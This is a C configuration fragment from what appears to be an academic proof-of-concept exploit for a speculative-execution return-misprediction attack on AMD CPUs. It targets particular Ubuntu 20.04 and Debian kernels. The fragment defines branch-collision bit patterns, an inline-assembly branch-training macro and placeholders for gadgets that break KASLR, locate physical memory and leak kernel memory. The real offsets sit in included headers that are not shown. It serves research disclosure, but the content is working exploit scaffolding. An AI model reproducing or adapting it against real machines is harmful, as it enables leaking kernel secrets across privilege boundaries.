/**
 * We're targeting the latest kernel on Ubuntu 20.04 (focal). It's assumed to
 * installed directly from the offical repo. The offsets below can be collected
 * in an offline phase using static analysis.
 */
// Makefile defines these
// #define DEBIAN_5_10_26_kwik
// #define UBUNTU_5_8_0_63_GENERIC

/**
 * Using this pattern we create a collision on return instructions in the
 * kernel.  bit 23 is the crucial one to flip to get a collision but it seems
 * like there's an even better signal when flipping more, probably I'm just
 * imagining things. More details in the paper.
 *
 * Note for Zen1: A different pattern is used. We can supply exploits for Zen1
 * too. It *should* only need a different pattern here.
 */
#define PWN_PATTERN  0xffff80f00f800000UL
#define PWN_PATTERN2 0xffff802002800000UL

#ifndef SYS_MMAP
#define SYS_MMAP 9
#endif

#define TRAINING_ASM asm volatile ("jmp *%1" :: "c"(pi->target), "r"(pi->bb_start))


#if defined(UBUNTU_5_8_0_63_GENERIC)
#include "./offsets_5_8_0_63_generic.h"
#elif defined(DEBIAN_5_10_26_kwik)
#include "./offsets_5_10_26_kwik.h"
#else
#error I don't know your kernel...
#define OFFSET 0
#define MMAP_LAST_TGT 0UL
#define MMAP_RET_OFFSET 0UL
#define MMAP_BB_SZ 0UL
#define KASLR_OFFSET 0UL
#define CALL_KASLR_GADGET(...)
#define PA_OFFSET 0UL
#define CALL_PA_GADGET(...)
#define PHYSMAP_OFFSET 0UL
#define CALL_PHYSMAP_GADGET(...)
#define LEAK_ASCII_OFFSET 0UL
#define CALL_LEAK_ASCII_GADGET(...)
#define LEAK_OFFSET 0UL
#define CALL_LEAK_GADGET(...)
#endif
